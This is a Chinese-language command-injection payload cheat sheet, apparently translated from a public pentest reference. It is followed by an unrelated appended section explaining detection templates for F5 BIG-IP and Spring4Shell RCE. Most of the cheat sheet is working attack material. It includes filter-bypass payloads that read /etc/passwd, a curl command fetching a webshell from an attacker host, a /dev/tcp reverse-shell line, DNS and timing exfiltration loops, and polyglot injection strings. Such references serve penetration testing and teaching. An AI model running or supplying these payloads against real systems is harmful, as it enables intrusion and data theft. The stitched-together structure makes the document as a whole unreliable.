# 命令注入 (Command Injection)

> 命令注入是一种安全漏洞，允许攻击者在易受攻击的应用程序中执行任意命令。

## 目录

* [工具](#工具)
* [方法学](#方法学)
    * [基础命令](#基础命令)
    * [命令链](#命令链)
    * [参数注入](#参数注入)
    * [在命令内部](#在命令内部)
* [过滤器绕过](#过滤器绕过)
    * [无空格绕过](#无空格绕过)
    * [使用换行符绕过](#使用换行符绕过)
    * [使用反斜杠换行绕过](#使用反斜杠换行绕过)
    * [使用波浪号扩展绕过](#使用波浪号扩展绕过)
    * [使用大括号扩展绕过](#使用大括号扩展绕过)
    * [绕过字符过滤](#绕过字符过滤)
    * [通过十六进制编码绕过字符过滤](#通过十六进制编码绕过字符过滤)
    * [使用单引号绕过](#使用单引号绕过)
    * [使用双引号绕过](#使用双引号绕过)
    * [使用反引号绕过](#使用反引号绕过)
    * [使用反斜杠和斜杠绕过](#使用反斜杠和斜杠绕过)
    * [使用$@绕过](#使用-绕过)
    * [使用$()绕过](#使用-1)
    * [使用变量扩展绕过](#使用变量扩展绕过)
    * [使用通配符绕过](#使用通配符绕过)
* [数据外泄](#数据外泄)
    * [基于时间的数据外泄](#基于时间的数据外泄)
    * [基于DNS的数据外泄](#基于dns的数据外泄)
* [多语言命令注入](#多语言命令注入)
* [技巧](#技巧)
    * [后台运行长时间命令](#后台运行长时间命令)
    * [删除注入点后的参数](#删除注入点后的参数)
* [实验环境](#实验环境)
    * [挑战](#挑战)
* [参考资料](#参考资料)

## 工具

* [commixproject/commix](https://github.com/commixproject/commix) - 自动化的一体化操作系统命令注入和利用工具
* [projectdiscovery/interactsh](https://github.com/projectdiscovery/interactsh) - 一个OOB交互收集服务器和客户端库

## 方法学

命令注入，也称为shell注入，是一种攻击类型，攻击者可以通过易受攻击的应用程序在主机操作系统上执行任意命令。当应用程序将不安全的用户提供的数据（表单、cookie、HTTP头等）传递给系统shell时，可能存在此漏洞。在这种情况下，系统shell是一个命令行界面，用于处理要执行的命令，通常在Unix或Linux系统上。

命令注入的危险在于，它可能允许攻击者在系统上执行任何命令，可能导致系统完全被攻陷。

**PHP命令注入示例**:
假设您有一个PHP脚本，它接受用户输入来ping指定的IP地址或域名：

```php
<?php
    $ip = $_GET['ip'];
    system("ping -c 4 " . $ip);
?>
```

在上面的代码中，PHP脚本使用`system()`函数执行`ping`命令，其中IP地址或域名由用户通过`ip` GET参数提供。

如果攻击者提供类似`8.8.8.8; cat /etc/passwd`的输入，实际执行的命令将是：`ping -c 4 8.8.8.8; cat /etc/passwd`。

这意味着系统将首先`ping 8.8.8.8`，然后执行`cat /etc/passwd`命令，这将显示`/etc/passwd`文件的内容，可能泄露敏感信息。

### 基础命令

执行命令，然后收工 :p

```powershell
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
...
```

### 命令链

在许多命令行界面中，特别是在类Unix系统中，有几个字符可用于链接或操作命令。

* `;` (分号): 允许您按顺序执行多个命令。
* `&&` (与): 仅当第一个命令成功（返回零退出状态）时才执行第二个命令。
* `||` (或): 仅当第一个命令失败（返回非零退出状态）时才执行第二个命令。
* `&` (后台): 在后台执行命令，允许用户继续使用shell。
* `|` (管道): 将第一个命令的输出作为第二个命令的输入。

```powershell
command1; command2   # 执行command1，然后执行command2
command1 && command2 # 仅当command1成功时执行command2
command1 || command2 # 仅当command1失败时执行command2
command1 & command2  # 在后台执行command1
command1 | command2  # 将command1的输出通过管道传递给command2
```

### 参数注入

当您只能向现有命令追加参数时获取命令执行。
使用此网站[Argument Injection Vectors - Sonar](https://sonarsource.github.io/argument-injection-vectors/)查找要注入的参数以获取命令执行。

* Chrome

    ```ps1
    chrome '--gpu-launcher="id>/tmp/foo"'
    ```

* SSH

    ```ps1
    ssh '-oProxyCommand="touch /tmp/foo"' foo@foo
    ```

* psql

    ```ps1
    psql -o'|id>/tmp/foo'
    ```

参数注入可以利用[worstfit](https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/)技术进行滥用。

在以下示例中，payload `＂ --use-askpass=calc ＂`使用**全角双引号**(U+FF02)而不是**常规双引号**(U+0022)

```php
$url = "https://example.tld/" . $_GET['path'] . ".txt";
system("wget.exe -q " . escapeshellarg($url));
```

有时，可能无法直接从注入点执行命令，但您可能能够将流重定向到特定文件，从而部署Web shell。

* curl

    ```ps1
    # -o, --output <file>        将输出写入文件而不是标准输出
    curl http://evil.attacker.com/ -o webshell.php
    ```

### 在命令内部

* 使用反引号进行命令注入。

  ```bash
  original_cmd_by_server `cat /etc/passwd`
  ```

* 使用替换进行命令注入

  ```bash
  original_cmd_by_server $(cat /etc/passwd)
  ```

## 过滤器绕过

### 无空格绕过

* `$IFS`是一个特殊的shell变量，称为内部字段分隔符。默认情况下，在许多shell中，它包含空白字符（空格、制表符、换行符）。当在命令中使用时，shell会将`$IFS`解释为空格。`$IFS`在`ls`、`wget`等命令中不能直接作为分隔符使用；请改用`${IFS}`。

  ```powershell
  cat${IFS}/etc/passwd
  ls${IFS}-la
  ```

* 在某些shell中，大括号扩展会生成任意字符串。执行时，shell会将大括号内的项目视为单独的命令或参数。

  ```powershell
  {cat,/etc/passwd}
  ```

* 输入重定向。`<`字符告诉shell读取指定文件的内容。

  ```powershell
  cat</etc/passwd
  sh</dev/tcp/127.0.0.1/4242
  ```

* ANSI-C引用

  ```powershell
  X=$'uname\x20-a'&&$X
  ```

* 制表符有时可以用作空格的替代。在ASCII中，制表符由十六进制值`09`表示。

  ```powershell
  ;ls%09-al%09/home
  ```

* 在Windows中，`%VARIABLE:~start,length%`是用于对环境变量进行子字符串操作的语法。

  ```powershell
  ping%CommonProgramFiles:~10,-18%127.0.0.1
  ping%PROGRAMFILES:~10,-5%127.0.0.1
  ```

### 使用换行符绕过

命令也可以用换行符按顺序运行

```bash
original_cmd_by_server
ls
```

### 使用反斜杠换行绕过

* 命令可以通过使用反斜杠后跟换行符来分成多个部分

  ```powershell
  $ cat /et\
  c/pa\
  sswd
  ```

* URL编码形式如下：

  ```powershell
  cat%20/et%5C%0Ac/pa%5C%0Asswd
  ```

### 使用波浪号扩展绕过

```powershell
echo ~+
echo ~-
```

### 使用大括号扩展绕过

```powershell
{,ip,a}
{,ifconfig}
{,ifconfig,eth0}
{l,-lh}s
{,echo,#test}
{,$"whoami",}
{,/?s?/?i?/c?t,/e??/p??s??,}
```

### 绕过字符过滤

不使用反斜杠和斜杠执行命令 - Linux bash

```powershell
swissky@crashlab:~$ echo ${HOME:0:1}
/

swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ echo . | tr '!-0' '"-1'
/

swissky@crashlab:~$ tr '!-0' '"-1' <<< .
/

swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
root:x:0:0:root:/root:/bin/bash
```

### 通过十六进制编码绕过字符过滤

```powershell
swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
/etc/passwd

swissky@crashlab:~$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
root:x:0:0:root:/root:/bin/bash
```

### 使用单引号绕过

```powershell
w'h'o'am'i
wh''oami
'w'hoami
```

### 使用双引号绕过

```powershell
w"h"o"am"i
wh""oami
"w"hoami
```

### 使用反引号绕过

```powershell
wh``oami
```

### 使用反斜杠和斜杠绕过

```powershell
w\ho\am\i
/\b\i\n/////s\h
```

### 使用$@绕过

`$0`: 引用脚本的名称（如果作为脚本运行）。如果您在交互式shell会话中，`$0`通常会给出shell的名称。

```powershell
who$@ami
echo whoami|$0
```

### 使用$()绕过

```powershell
who$()ami
who$(echo am)i
who`echo am`i
```

### 使用变量扩展绕过

```powershell
/???/??t /???/p??s??

test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```

### 使用通配符绕过

```powershell
powershell C:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
```

## 数据外泄

### 基于时间的数据外泄

逐个字符提取数据，并根据延迟检测正确的值。

* 正确值：等待5秒

  ```powershell
  swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
  real    0m5.007s
  user    0m0.000s
  sys 0m0.000s
  ```

* 错误值：无延迟

  ```powershell
  swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
  real    0m0.002s
  user    0m0.000s
  sys 0m0.000s
  ```

### 基于DNS的数据外泄

基于[HoLyVieR/dnsbin](https://github.com/HoLyVieR/dnsbin)工具，也托管在[dnsbin.zhack.ca](http://dnsbin.zhack.ca/)

1. 访问[dnsbin.zhack.ca](http://dnsbin.zhack.ca)
2. 执行简单的'ls'

   ```powershell
   for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
   ```

用于检查基于DNS的数据外泄的在线工具：

* [dnsbin.zhack.ca](http://dnsbin.zhack.ca)
* [app.interactsh.com](https://app.interactsh.com)
* [portswigger.net](https://portswigger.net/burp/documentation/collaborator)

## 多语言命令注入

多语言代码是指在多种编程语言或环境中同时有效且可执行的代码。当我们谈论"多语言命令注入"时，我们指的是可以在多种上下文或环境中执行的注入有效负载。

* 示例1：

  ```powershell
  有效负载: 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

  # 在单引号和双引号内的命令上下文中：
  echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
  echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
  echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
  ```

* 示例2：

  ```powershell
  有效负载: /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/

  # 在单引号和双引号内的命令上下文中：
  echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
  echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"
  echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/'
  ```

## 技巧

### 后台运行长时间命令

在某些情况下，您可能有一个长时间运行的命令，由于注入它的进程超时而被终止。使用`nohup`，您可以在父进程退出后保持进程运行。

```bash
nohup sleep 120 > /dev/null &
```

### 删除注入点后的参数

在类Unix命令行界面中，`--`符号用于表示命令选项的结束。在`--`之后，所有参数都被视为文件名和参数，而不是选项。

## 实验环境

* [PortSwigger - 操作系统命令注入，简单案例](https://portswigger.net/web-security/os-command-injection/lab-simple)
* [PortSwigger - 带时间延迟的盲操作系统命令注入](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
* [PortSwigger - 带输出重定向的盲操作系统命令注入](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
* [PortSwigger - 带带外交互的盲操作系统命令注入](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
* [PortSwigger - 带带外数据外泄的盲操作系统命令注入](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
* [Root Me - PHP - 命令注入](https://www.root-me.org/en/Challenges/Web-Server/PHP-Command-injection)
* [Root Me - 命令注入 - 过滤器绕过](https://www.root-me.org/en/Challenges/Web-Server/Command-injection-Filter-bypass)
* [Root Me - PHP - assert()](https://www.root-me.org/en/Challenges/Web-Server/PHP-assert)
* [Root Me - PHP - preg_replace()](https://www.root-me.org/en/Challenges/Web-Server/PHP-preg_replace)

### 挑战

基于前面的技巧，以下命令有什么作用：

```powershell
g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
```

**注意**：该命令可以安全运行，但您不应该信任我。

## 参考资料

* [参数注入与绕过Shellwords.escape - Etienne Stalmans - 2019年11月24日](https://staaldraad.github.io/post/2019-11-24-argument-injection/)
* [参数注入向量 - SonarSource - 2023年2月21日](https://sonarsource.github.io/argument-injection-vectors/)
* [回到未来：Unix通配符失控 - Leon Juranic - 2014年6月25日](https://www.exploit-db.com/papers/33930)
* [通过字符串操作进行Bash混淆 - Malwrologist, @DissectMalware - 2018年8月4日](https://twitter.com/DissectMalware/status/1025604382644232192)
* [Bug Bounty调查 - Windows RCE无空格 - Bug Bounties调查 - 2017年5月4日](https://web.archive.org/web/20180808181450/https://twitter.com/bugbsurveys/status/860102244171227136)
* [无PHP，无空格，无$，无{}，仅Bash - Sven Morgenroth - 2017年8月9日](https://twitter.com/asdizzle_/status/895244943526170628)
* [操作系统命令注入 - PortSwigger - 2024年](https://portswigger.net/web-security/os-command-injection)
* [SECURITY CAFÉ - 利用基于时间的RCE - Pobereznicenco Dan - 2017年2月28日](https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/)
* [TL;DR: 如何利用/绕过/使用PHP的escapeshellarg/escapeshellcmd函数 - kacperszurek - 2018年4月25日](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md)
* [WorstFit: 揭示Windows ANSI中隐藏的转换器 - Orange Tsai - 2025年1月10日](https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/)
* [Command Injection - OWASP](https://owasp.org/www-community/attacks/Command_Injection)
* [Command Injection | HackTricks](https://book.hacktricks.xyz/pentesting-web/command-injection)

---

## 八、典型漏洞 YAML 文件分析

远程命令执行（RCE）是危害最严重的漏洞之一。本目录收录了多种 RCE 漏洞的利用模板，以下对部分典型 YAML 文件进行详细解读。

### 1. CVE-2022-1388.yaml (F5 BIG-IP iControl RCE)
- **漏洞类型**：认证绕过 & 命令注入
- **漏洞原理**：
  该漏洞源于 F5 BIG-IP 的 iControl REST 接口在处理特定 HTTP 请求头时存在逻辑缺陷。当请求中包含 `X-F5-Auth-Token` 头，并且 `Connection` 头中包含 `X-F5-Auth-Token` 值时，认证被完全绕过。攻击者可以利用这个缺陷，在无需任何凭证的情况下，直接向 `/mgmt/tm/util/bash` 端点发送请求，执行任意系统命令。
- **探测原理**：
  该 YAML 模板构造一个 POST 请求，请求头包含 `Connection: keep-alive, X-F5-Auth-Token` 和 `X-F5-Auth-Token: a`。请求体中包含一个 JSON payload，指定通过 `bash` 执行一个 `echo` 命令。如果响应体中包含了 `echo` 命令执行后的预期回显（一个倒序的字符串），则证明漏洞存在。
- **修复建议**：立即升级 F5 BIG-IP 至官方修复版本，或应用官方提供的缓解措施。

### 2. CVE-2022-22965.yaml (Spring4Shell)
- **漏洞类型**：远程代码执行（数据绑定）
- **漏洞原理**：
  该漏洞存在于 Spring Framework 中，当应用程序运行在 JDK 9+ 和 Apache Tomcat 上时，其数据绑定功能存在风险。攻击者可以通过发送特制的 HTTP 请求，修改 `ClassLoader` 的属性。通过链式调用，攻击者可以设置 Tomcat 的日志记录属性（如 `accesslog`），将日志文件的路径、前缀、后缀等指向 Web 目录下的一个 JSP 文件，并将日志内容设置为恶意的 JSP Webshell 代码。当服务器记录下一条访问日志时，这个 Webshell 就会被写入服务器，从而导致远程代码执行。
- **探测原理**：
  此模板的探测方式相对"温和"，它并不直接写入 Webshell。它通过数据绑定将 Tomcat 的一个配置文件属性 (`class.module.classLoader.resources.context.configFile`) 指向一个攻击者控制的 `interactsh` URL。如果 Spring 应用尝试通过 `ClassLoader` 加载这个远程配置文件，`interactsh` 就会收到一个来自目标服务器的 HTTP 请求，从而验证漏洞的存在。
- **修复建议**：升级 Spring Framework 至 5.3.18+ 或 5.2.20+ 版本。对于 Spring Boot 应用，升级至 2.6.6+ 或 2.5.12+ 版本。

---

#### 总结
RCE 漏洞的成因多种多样，但最终都归结于将用户可控的数据当作代码来执行。
- **命令注入**（如 F5 BIG-IP）：直接将用户输入拼接到了系统命令中。
- **危险的函数/特性**（如 Spring4Shell）：利用了框架或语言的复杂特性（如数据绑定、反射、类加载）来间接实现代码执行。
防御 RCE 的核心是严格区分数据与代码，对任何用户输入都进行严格的无害化处理，并遵循最小权限原则，限制应用执行系统命令的能力。
